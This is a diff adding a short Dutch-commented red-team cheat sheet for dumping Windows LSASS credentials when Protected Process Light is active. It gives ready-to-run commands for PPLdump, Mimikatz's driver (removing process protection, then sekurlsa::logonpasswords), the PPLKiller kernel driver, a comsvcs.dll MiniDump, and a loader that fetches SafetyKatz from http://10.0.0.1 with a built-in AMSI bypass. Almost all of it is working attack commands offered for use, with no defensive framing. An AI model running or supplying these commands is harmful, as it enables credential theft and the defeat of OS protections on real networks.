@@ -1,0 +1,16 @@
+# LSASS dump wanneer RunAsPPL actief is (Protected Process Light)
+# Methode 1: PPLdump (exploits LSASS PPL protection)
+.\PPLdump.exe lsass.exe C:\Windows\tasks\lsass.dmp
+# Methode 2: Via Mimikatz driver (mimidrv.sys)
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # sekurlsa::logonpasswords
+# Methode 3: PPLKiller (kernel driver exploit)
+.\PPLKiller.exe /installDriver
+.\PPLKiller.exe /disablePPL lsass
+.\PPLKiller.exe /uninstallDriver
+# Daarna normale dump:
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\tasks\lsass.dmp full
+# Methode 4: SafetyKatz (MiniDumpWriteDump in-memory, AMSI bypass ingebouwd)
+C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/SafetyKatz.exe
+# Tip: Check PPL status: Get-Process lsass | Format-List *protect*
